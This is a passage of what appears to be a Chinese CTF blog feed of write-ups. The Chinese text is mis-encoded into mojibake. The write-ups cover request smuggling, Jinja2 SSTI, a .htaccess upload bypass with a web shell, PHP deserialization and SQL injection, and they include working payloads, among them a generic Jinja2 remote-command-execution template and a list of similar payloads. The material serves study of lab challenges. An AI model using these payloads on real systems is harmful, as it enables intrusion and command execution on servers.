src="https://ftp.bmp.ovh/imgs/2021/02/b57fd5c9f6a6fba5.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯<code>phpinfo()</code>æ˜¯æ­£å¸¸æ‰§è¡Œäº†çš„ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¾“å…¥ä¸€äº›å‡½æ•°è¯»å–flagäº†<br>payloadï¼š<code>num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>        </p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>å‰ç«¯æœåŠ¡å™¨åªå¤„ç†<code>Content-Length</code>,è€Œåç«¯æœåŠ¡å™¨éµå¾ª<a href="https://www.cnblogs.com/k1988/archive/2010/01/12/2165683.html">RFC2616</a>çš„è§„å®šï¼Œå¿½ç•¥æ‰<code>Content-Length</code>è€Œå¤„ç†<code>Transfer-Encoding</code>      </p><pre><code>POST / HTTP/1.1\r\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG     </code></pre><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œå‘é€ç»™åç«¯ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>,å½“è¯»åˆ°<code>0\r\n</code>æ—¶ç»“å°¾ï¼Œæ­¤æ—¶ä¼šç•™ä¸‹ä¸€ä¸ª<code>G</code>åœ¨ç¼“å†²åŒºä¸­ ã€‚               </p><p>æ —å­ï¼š<br>é¢˜ç›®ï¼šHGAME week1 èµ°ç§è€…çš„æ„¤æ€’<br>CL-TE<br><img src="https://ftp.bmp.ovh/imgs/2021/02/41a76ce1c99f06c3.png"><br><code>Apache Traffic Server 7.1.2 </code>æ‰€ä»¥å¯èƒ½å­˜åœ¨èµ°ç§<br><img src="https://ftp.bmp.ovh/imgs/2021/02/896cf2274b6ca481.png"><br>æ‰€ä»¥åœ¨èµ°ç§çš„è¯·æ±‚ä¸­åŠ å…¥<code>Client-IP:localhost</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/32f96b824c275b5e.png"><br>å®˜æ–¹WPä¸­è¯´è¿™é“é¢˜ä¸­é—´è¿˜åŠ äº†ä¸ª<code>nginx</code>    </p><pre><code>                        +---[8080]---+                        | 9012-&gt;8080 |                        | ATS7       |                        |            |                        +-------+----+                               |                               |                        +------------+                        |            |                        | nginx      |                        |            |                        +-------+----+                              |                              |                        +---[80]+----+                        |            |                        | LNMP       |                        |            |                        +------------+        </code></pre><p>é‚£ä¸ªä¸‹é¢çš„<code>Content-Length</code>åº”è¯¥å°±æ˜¯é€šè¿‡ngixçš„å¤„ç†çš„å§          </p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>å‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç†<code>Transfer-Encoding</code>è¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨å¤„ç†<code>Content-Length</code>è¯·æ±‚å¤´ </p><pre><code>POST / HTTP/1.1\r\nHost: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nCookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n           </code></pre><hr><h4 id="å‡ ä¸ªé—®é¢˜"><a href="#å‡ ä¸ªé—®é¢˜" class="headerlink" title="å‡ ä¸ªé—®é¢˜"></a>å‡ ä¸ªé—®é¢˜</h4><ul><li>å¦‚ä½•åˆ¤æ–­ä¸€é“é¢˜æ˜¯è€ƒçš„è¯·æ±‚èµ°ç§ï¼Ÿ<br>å¦‚æœèƒ½çŸ¥é“æœåŠ¡å™¨Apacheç‰ˆæœ¬å·ï¼Œæ€€ç–‘â€”â€“&gt;<code>æµ‹è¯•</code>     </li><li>å¦‚ä½•åˆ¤æ–­æ˜¯å“ªä¸€ç±»ï¼Ÿ<br><code>æµ‹è¯•ï¼</code></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜026</title>
    <link href="/2021/02/09/BUU026/"/>
    <url>/2021/02/09/BUU026/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåå…­ã€"><a href="#äºŒåå…­ã€" class="headerlink" title="äºŒåå…­ã€"></a>äºŒåå…­ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[BJDCTF 2nd]fake google<br><img src="https://ftp.bmp.ovh/imgs/2021/02/699942b36831db1a.png"> </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æºç ä¸­æ²¡å‘ç°ä»€ä¹ˆ<br>éšä¾¿è¾“ä¸ªçœ‹çœ‹<img src="https://ftp.bmp.ovh/imgs/2021/02/1e1ee07b33ec1f28.png"><br>ä¸çŸ¥é“æç¤ºçš„ä»€ä¹ˆæ„æ€ï¼Œçœ‹äº†wpçŸ¥é“æ˜¯sstiæ¨¡æ¿æ³¨å…¥<br>æŒ‰ä¸‹å›¾åˆ¤æ–­æ¨¡æ¿å¼•æ“<img src="https://ftp.bmp.ovh/imgs/2021/02/cd1b1a2982003c38.png"><br>è¾“å…¥ï¼š<code>&#123;&#123;7*7&#125;&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/02/ec6e2a009fa2999d.png">æ‰€ä»¥åº”è¯¥æ˜¯jinja2ï¼›å¦‚æœç”¨tplmapçš„è¯å¯ä»¥ç›´æ¥å¾—åˆ°æ˜¯jinja2         </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p><p>ä¸€ä½å¤§ä½¬çš„jinja2æ¨¡æ¿å¼•æ“é€šç”¨çš„RCE payloadï¼š<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br><command>æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤       </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>payloadç›¸å…³å‡½æ•°      </p><blockquote><p><code>__class__</code> è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡<br><code>__subclasses__ </code>æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨<br><code>__init__ </code>ç±»çš„åˆå§‹åŒ–æ–¹æ³•<br><code>__globals__</code> å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨<br><code>__mro__</code>è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æ<br><code>__bases__ </code>è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»<br><code> __builtins__</code>æ˜¯åšä¸ºé»˜è®¤åˆå§‹æ¨¡å—        </p></blockquote><p>jinja2è¯­æ³•       </p><blockquote><p>æ§åˆ¶ç»“æ„<code>&#123;% %&#125;</code><br>å˜é‡å–å€¼<code>&#123;&#123; &#125;&#125;</code><br>jinja2æ¨¡æ¿ä¸­ä½¿ç”¨ <code>&#123;&#123; &#125;&#125;</code> è¯­æ³•è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ã€‚å½“åˆ©ç”¨jinja2è¿›è¡Œæ¸²æŸ“çš„æ—¶å€™ï¼Œå®ƒä¼šæŠŠè¿™äº›ç‰¹æ®Šçš„å ä½ç¬¦è¿›è¡Œå¡«å……/æ›¿æ¢ï¼Œjinja2æ”¯æŒpythonä¸­æ‰€æœ‰çš„Pythonæ•°æ®ç±»å‹æ¯”å¦‚åˆ—è¡¨ã€å­—æ®µã€å¯¹è±¡ç­‰<br>æ³¨é‡Š<code>&#123;# #&#125;</code><br><a href="https://www.jianshu.com/p/f04dae701361">MORE</a>      </p></blockquote><p>æŠ„ä¸€ä¸‹å¤§ä½¬æ”¶é›†çš„payload        </p><blockquote><ol><li><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code>         </li><li><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )&#125;&#125;</code>                </li><li><code>&#123;&#123;object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')&#125;&#125;</code>     </li><li><code>&#123;&#123;request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')&#125;&#125;</code>    <a href="https://www.jianshu.com/p/e341b7b7d4f3">è½¬</a>       </li></ol></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜025</title>
    <link href="/2021/02/08/BUU025/"/>
    <url>/2021/02/08/BUU025/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåäº”ã€"><a href="#äºŒåäº”ã€" class="headerlink" title="äºŒåäº”ã€"></a>äºŒåäº”ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[MRCTF2020]ä½ ä¼ ä½ maå‘¢<br><img src="https://ftp.bmp.ovh/imgs/2021/02/c1862f50b71396ed.png">  </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸€é“ä¸Šä¼ é¢˜<br>phpã€phtmléƒ½ä¸èƒ½ä¼ ï¼Œåªèƒ½æ˜¯jpgæˆ–è€…png<br>çœ‹wpè¯´æ˜¯è¦ç”¨åˆ°<code>.htaccess</code><br>é‡Œé¢å†™ä¸Š</p><pre><code>SetHandler application/x-httpd-php//è¿™è¯­å¥çš„ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ     </code></pre><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>å…ˆä¸Šä¼ <code>.htaccess</code><br>æŠ“åŒ…æ”¹ä¸€ä¸‹<code>Content-Type</code><br>åœ¨ä¸Šä¼ é©¬ï¼Œåç¼€æ”¹ä¸º<code>.jpg</code><br>èšå‰‘è¿æ¥<br>æ ¹ç›®å½•ä¸‹å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/8fe79ecab142d608.png">  </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><code>.htaccess</code>æ–‡ä»¶     </p><blockquote><p><code>.htaccess</code>æ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚    </p><p><code>SetHandler application/x-httpd-php .jpg</code><br>//å°†jpgä»¥phpè§£æ </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜024</title>
    <link href="/2021/02/07/BUU024/"/>
    <url>/2021/02/07/BUU024/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåå››ã€"><a href="#äºŒåå››ã€" class="headerlink" title="äºŒåå››ã€"></a>äºŒåå››ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">protected</span> $op;    <span class="hljs-keyword">protected</span> $filename;    <span class="hljs-keyword">protected</span> $content;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $op = <span class="hljs-string">&quot;1&quot;</span>;        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;            <span class="hljs-keyword">$this</span>-&gt;write();        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;            $res = <span class="hljs-keyword">$this</span>-&gt;read();            <span class="hljs-keyword">$this</span>-&gt;output($res);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);                <span class="hljs-keyword">die</span>();            &#125;            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;        $res = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);        &#125;        <span class="hljs-keyword">return</span> $res;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> $s;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;process();    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];    <span class="hljs-keyword">if</span>(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre></code></pre><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸€å¤§æ®µä»£ç ï¼Œå¾ˆå¯æ€•<br>é€šè¿‡<code>read()</code>å‡½æ•°ä¸­çš„<code>file_get_contents</code>å’Œ<code>process()</code>å‡½æ•°ä¸­çš„<code> $this-&gt;output($res);</code><br>æˆ‘ä»¬åº”è¯¥åˆ©ç”¨è¿™ä¸ªè¯»å–åˆ°<code>flag.php</code><br>ä¼ ä¸€ä¸ªåºåˆ—åŒ–çš„$str,filename=flag.php,è°ƒç”¨read()å‡½æ•°éœ€è¦op==â€2â€;è€Œææ„å‡½æ•°é‡Œæœ‰ä¸ª</p><pre><code>if($this-&gt;op === &quot;2&quot;)     $this-&gt;op = &quot;1&quot;;     </code></pre><p>æ‰€ä»¥ä¸èƒ½ä½¿<code>op===&quot;2&quot;</code>æˆç«‹ï¼Œè¿ç”¨å¼±ç±»å‹è®©<code>op=2</code>å³å¯          </p><pre><code>function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;    </code></pre><p>è¿™ä¸ªè¦æ±‚$strçš„ASCIIç å¿…é¡»åœ¨32~125ä¹‹é—´<br>protectedç±»åœ¨åºåˆ—åŒ–åå«æœ‰%00ï¼Œå…¶ASCIIç ä¸º0<br>PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥æ”¹æˆpublicç±»ç»•è¿‡       </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&quot;flag.php&quot;</span>;    <span class="hljs-keyword">public</span> $content=<span class="hljs-string">&quot;hello&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> FileHandler();$b=serialize($a);<span class="hljs-keyword">echo</span> $b;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>payloadï¼š<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;hello&quot;;&#125;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/7fca77026da21ca9.png">  </p><hr><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®  </p><pre><code>public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;     </code></pre><hr><p>æˆ–è€…<br>ä¸æ”¹ç±»å‹ï¼Œè¿˜æ˜¯protected<br>å°†åºåˆ—åŒ–åçš„å­—èŠ‚æµä¸­ç”¨å¤§å†™Sè¡¨ç¤ºè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºï¼Œå°±å¯ä»¥å°†<code>%00</code>æ›¿æ¢ä¸º<code>\00</code><br>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;s:5:&quot;hello&quot;;&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜023</title>
    <link href="/2021/02/06/BUU023/"/>
    <url>/2021/02/06/BUU023/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåä¸‰ã€"><a href="#äºŒåä¸‰ã€" class="headerlink" title="äºŒåä¸‰ã€"></a>äºŒåä¸‰ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[GXYCTF2019]BabySQli<br><img src="https://ftp.bmp.ovh/imgs/2021/02/882964df2e56c968.png">  </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><code>name=admin&amp;pw=123</code>â€”â€”â€”â€“<code>wrong pass!</code><br><code>name=admin&#39;&amp;pw=123</code>â€”â€”â€”-<code>æŠ¥é”™</code><br><code>name=admin&amp;pw=1&#39;</code>â€”â€”â€”â€”<code>wrong pass!</code><br>è¯´æ˜<code>name</code>å­˜åœ¨æ³¨å…¥ï¼Œ<code>pw</code>ä¸å­˜åœ¨<br>åœ¨<code>search.php</code>é¡µé¢æºç æ³¨é‡Šä¸­å‘ç°ï¼š<br><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code><br>base32ç„¶åbase64è§£ç å¾—åˆ°SQLè¯­å¥<br><code>select * from user where username = &#39;$name&#39;</code><br><code>orã€=ã€(ã€)</code>è¢«è¿‡æ»¤ï¼Œä½†ORå¯ä»¥<br><code>admin&#39; Order by 4#</code>â€”â€”â€”<code>Error: Unknown column &#39;4&#39; in &#39;order clause&#39; </code>è¯´æ˜æœ‰ä¸‰åˆ—<br><code>1&#39; union select 1,2,3#</code>çœ‹å›æ˜¾ä½ï¼Œç»“æœæ˜¯<code>wrong user!</code><br>å°†1æ”¹ä¸º<code>&#39;admin&#39;</code>,è¿˜æ˜¯wrong userï¼›æ”¹åˆ°ç¬¬äºŒä½ï¼Œå˜æˆäº†wrong passï¼Œè¯´æ˜adminåœ¨ç¬¬äºŒåˆ—       </p><hr><p>åœ¨BUUç»™çš„è¿™é“é¢˜çš„æºç ä¸­<img src="https://ftp.bmp.ovh/imgs/2021/02/0eafd76c74fd6cb3.png"><br><code>arr[1]==&#39;admin&#39;</code>é‚£ä¹ˆ<code>arr[2]</code>åº”è¯¥å°±æ˜¯è¾“å…¥çš„pwå§<br>éœ€è¦<code>md5($password) == $arr[2]</code><br>æ‰€ä»¥åªè¦ä¼ å…¥çš„pwçš„MD5ç­‰äºç¬¬ä¸‰ä½å°±è¡Œäº† </p><hr><p>å¦‚æœæ²¡æœ‰æºç çš„æç¤ºï¼Œæ­£ç¡®çš„æ€è·¯åº”è¯¥æ˜¯åˆ©ç”¨sqlçš„ç‰¹æ€§ï¼š<code>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</code>     </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code>&amp;&amp;<code>pw=123</code><img src="https://ftp.bmp.ovh/imgs/2021/02/dee35a5c0bf7263c.png">        </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><code>sqlç‰¹æ€§</code>     </p><blockquote><p><img src="https://ftp.bmp.ovh/imgs/2021/02/0b5f477cb43f3a6c.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/02/0c57b06eb2a85b33.png"></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ctfhub</title>
    <link href="/2021/02/05/ctfhub/"/>
    <url>/2021/02/05/ctfhub/</url>
    
    <content type="html"><![CDATA[<h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><h3 id="ç½‘ç«™æºç "><a href="#ç½‘ç«™æºç " class="headerlink" title="ç½‘ç«™æºç "></a>ç½‘ç«™æºç </h3><p>æ‰“å¼€é¶åœºæ˜¯è¿™æ ·<br><img src="https://s1.imagehub.cc/images/2021/02/05/01.png" alt="01.png"><br>è¯•å‡ºäº†<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/02/e4a53dc8cc6e31e3.png"><br>å·®ç‚¹è®©æˆ‘ä»¥ä¸ºæ˜¯miscã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br>çœ‹wpè¯´æ˜¯è®¿é—®è¯¥æ–‡ä»¶åæ‰èƒ½å¾—åˆ°    <img src="https://s1.imagehub.cc/images/2021/02/05/03.png" alt="03.png">      </p><h3 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h3><ul><li>çŸ¥è¯†ç‚¹    